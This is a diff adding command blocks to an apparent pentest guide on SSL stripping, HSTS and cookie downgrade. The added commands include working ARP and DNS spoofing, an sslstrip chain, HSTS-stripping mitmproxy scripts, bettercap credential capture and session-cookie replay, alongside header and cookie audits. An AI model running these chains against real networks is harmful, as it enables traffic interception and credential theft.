@@ -76,6 +76,19 @@ Record each auth flow endpoint and its transport protocol in the graph.
 
 ### mitmproxy
 
+```bash
+# Transparent proxy on the LAN gateway — intercepts port 80 traffic
+sudo mitmproxy --mode transparent --showhost -w stripped.flows
+
+# Scripted HSTS stripping: drop Strict-Transport-Security from every proxied response
+cat > strip_hsts.py <<'EOF'
+def response(flow):
+    flow.response.headers.pop("Strict-Transport-Security", None)
+    flow.response.headers.pop("Content-Security-Policy", None)
+EOF
+
+sudo mitmdump --mode transparent --scripts strip_hsts.py
+```
 
 - Transparent mode: intercepts all traffic at the network layer.
 - `upstream_cert=false`: disables upstream certificate verification for testing.
@@ -84,6 +97,14 @@ Record each auth flow endpoint and its transport protocol in the graph.
 
 ### sslstrip (legacy)
 
+```bash
+# Classic sslstrip chain: enable forwarding -> iptables redirect -> arpspoof -> sslstrip
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+arpspoof -i eth0 -t <victim_ip> <gateway_ip> &
+arpspoof -i eth0 -t <gateway_ip> <victim_ip> &   # poison both directions
+python3 /usr/share/sslstrip/sslstrip.py -l 8080  # log captured traffic to sslstrip.log
+```
 
 - Listens on port 8080, redirects HTTP traffic through the stripper.
 - Patches `iptables` rules to capture port 80/443 traffic.
@@ -92,6 +113,17 @@ Record each auth flow endpoint and its transport protocol in the graph.
 
 ### bettercap
 
+```
+# Interactive session: ARP spoof + HTTP proxy with JS/link rewriting in one tool
+sudo bettercap -iface eth0
+set arp.spoof.targets <victim_ip>
+set http.proxy.sslstrip true          # enable sslstripping module
+http.proxy on
+arp.spoof on
+# Observe: net.show lists victims; events.stream prints intercepted URLs/creds
+net.probe on
+events.stream
+```
 
 - ARP spoofing + HTTP proxy in one tool.
 - JavaScript-based stripping scripts for link rewriting.
@@ -109,6 +141,20 @@ Record each auth flow endpoint and its transport protocol in the graph.
 
 ### First-Visit Attack
 
+```bash
+# Step 0: is the HTTP origin even reachable, and what does it return?
+curl -sI http://target.com | head -20
+# - 200 + content  => first-visit stripping viable
+# - 301/302 to https:// with Strict-Transport-Security on the redirect => hardened
+# - 301/302 without HSTS header => still strippable before the browser learns the policy
+
+# Check whether HSTS is served and with which directives (must be over HTTPS)
+curl -sI https://target.com | grep -i strict-transport-security
+
+# Query the local Chrome HSTS state for the domain (paste into chrome://net-internals/#hsts)
+# Domain query: target.com — "Not found" means no cached/preloaded entry
+```
+
 If the user has never visited the site (or cleared browser data), the HSTS preload list is the only defense. Testing steps:
 
 1. Check `chrome://net-internals/#hsts` — query the domain's preload status.
@@ -116,6 +162,17 @@ If the user has never visited the site (or cleared browser data), the HSTS prelo
 3. Check if the site sends HSTS on the HTTP→HTTPS redirect response (should be on the HTTPS response).
 
 ### Subdomain Not Covered
+
+```bash
+# Enumerate subdomains, then test each for HSTS coverage individually
+cat all_subs.txt | httpx -silent | while read url; do
+  hsts=$(curl -sIk --max-time 5 "https://$url" | grep -ci strict-transport-security)
+  [ "$hsts" = "0" ] && echo "NO-HSTS: $url"
+done
+
+# Probe the HTTP origin of a subdomain directly
+curl -sI http://app.target.com
+```
 
 - `Strict-Transport-Security: max-age=31536000` (no `includeSubDomains`) — subdomains are unprotected.
 - Test `http://app.target.com` or `http://api.target.com` separately.
@@ -150,6 +207,14 @@ Check for these misconfigurations:
 
 ### mitmproxy with --ignore-ssl-pin
 
+```bash
+# Upstream verification off + custom CA for the test client
+mitmdump --set ssl_insecure=true --set upstream_cert=false \
+  --certs *=/path/to/custom-ca.pem -w pinned_bypass.flows
+
+# Export the mitmproxy CA so the test browser trusts intercepted certs
+ls ~/.mitmproxy/mitmproxy-ca-cert.pem   # install into browser/device trust store
+```
 
 - Requires root/admin for certificate installation.
 - `--set ssl_insecure=true` to skip upstream verification.
@@ -168,12 +233,33 @@ Check for these misconfigurations:
 
 ### ARP Spoofing
 
+```bash
+# bidirectional ARP poisoning with dsniff's arpspoof (two terminals)
+sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
+
+# bettercap equivalent
+sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on"
+
+# Verify poisoning took effect from the victim: gateway MAC should equal attacker MAC
+arp -a | grep 192.168.1.1
+```
+
 - Send gratuitous ARP replies to poison the gateway's ARP table.
-- Tools: `arpspoof`, `bettercap`, ` Ettercap`.
+- Tools: `arpspoof`, `bettercap`, `Ettercap`.
 - Requires same Layer 2 network as the target.
 - Detection: static ARP entries, ARP monitoring (arpwatch).
 
 ### DNS Spoofing
+
+```bash
+# bettercap dns.spoof: resolve target.com to the attacker for victims on the LAN
+sudo bettercap -iface eth0 -eval "set dns.spoof.domains target.com; set dns.spoof.address <attacker_ip>; dns.spoof on"
+
+# dnsspoof with a hosts file mapping
+echo "<attacker_ip> target.com www.target.com" > /usr/local/share/hosts
+sudo dnsspoof -i eth0 -f /usr/local/share/hosts
+```
 
 - Respond to DNS queries with attacker-controlled IP.
 - Tools: `dnsspoof`, `bettercap`, custom DNS server.
@@ -212,6 +298,13 @@ Some resources are loaded over HTTP even on an HTTPS page. This creates exploita
 3. Identify which resources loaded successfully over HTTP.
 4. Test if those resources can be modified in transit (injection, defacement).
 
+```bash
+# Find HTTP-loaded resources referenced from the HTTPS page (mixed-content candidates)
+curl -sk https://target.com/ | grep -oE '(src|href)="http://[^"]+"'
+# Protocol-relative URLs also count — they resolve over HTTP if the page was stripped
+curl -sk https://target.com/ | grep -oE '(src|href)="//[^"]+"' | head -20
+```
+
 ---
 
 ## Cookie Downgrade
@@ -231,6 +324,18 @@ Some resources are loaded over HTTP even on an HTTPS page. This creates exploita
 4. If cookies are sent, the session can be hijacked.
 5. Check if `SameSite=None` is set without `Secure` — this is a misconfiguration.
 
+```bash
+# Capture the exact Set-Cookie flags on login
+curl -sk -X POST https://target.com/login -d 'user=test&pass=test' -D - -o /dev/null | grep -i set-cookie
+
+# Replay the session cookie over PLAIN HTTP — if the app accepts it, downgrade hijack works
+curl -sI http://target.com/account -H 'Cookie: session=<captured_value>'
+# 200 => cookie lacks Secure enforcement; 301 to https + no Set-Cookie leak => hardened
+
+# Confirm which resources still emit cookies over HTTP after stripping (mitmdump filter)
+mitmdump -nr stripped.flows --set flow_detail=1 '~u ^http://'
+```
+
 ### HttpOnly Bypass via Downgrade
 
 - `HttpOnly` prevents JavaScript from reading the cookie — but it is still sent in HTTP requests.
@@ -243,12 +348,21 @@ Some resources are loaded over HTTP even on an HTTPS page. This creates exploita
 
 ### Step 1: Redirect Handling
 
+```bash
+# Full redirect chain from HTTP, showing every hop and its headers
+curl -sIL http://target.com
+# Watch for: 301/302 Location: https://..., presence of Strict-Transport-Security at each hop
+```
 
 - If the HTTP request returns a 200 with content (no redirect), the site is immediately vulnerable.
 - If it redirects to HTTPS, check if HSTS header is present on the HTTPS response.
 
 ### Step 2: HSTS Header Analysis
 
+```bash
+curl -sI https://target.com | grep -i strict-transport-security
+# Expected (hardened):  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
 
 Check response headers for:
 - `Strict-Transport-Security` present and correctly configured.
@@ -258,11 +372,25 @@ Check response headers for:
 
 ### Step 3: Preload Status
 
+```bash
+# Check preload eligibility via Google's API
+curl -s "https://hstspreload.org/api/v2/status?domain=target.com" | jq .
+# "status": "preloaded" => stripping impossible; anything else => check HSTS header next
+```
+
 - Check https://hstspreload.org for the domain.
 - If not preloaded and HSTS is not set, the site is vulnerable to first-visit stripping.
 - Note: preload requires `includeSubDomains` and a `max-age` ≥ 31536000.
 
 ### Step 4: Cookie Security
+
+```bash
+# List all cookies with flags after an authenticated session
+curl -sk -X POST https://target.com/login -d 'user=test&pass=test' -D - -o /dev/null | grep -i set-cookie
+# Flag audit per cookie:
+#   Secure present? HttpOnly? SameSite=Lax/Strict/None?
+#   SameSite=None WITHOUT Secure = misconfiguration
+```
 
 - After authentication, check all cookies for `Secure` and `SameSite` attributes.
 - Test if cookies are sent over HTTP after stripping.
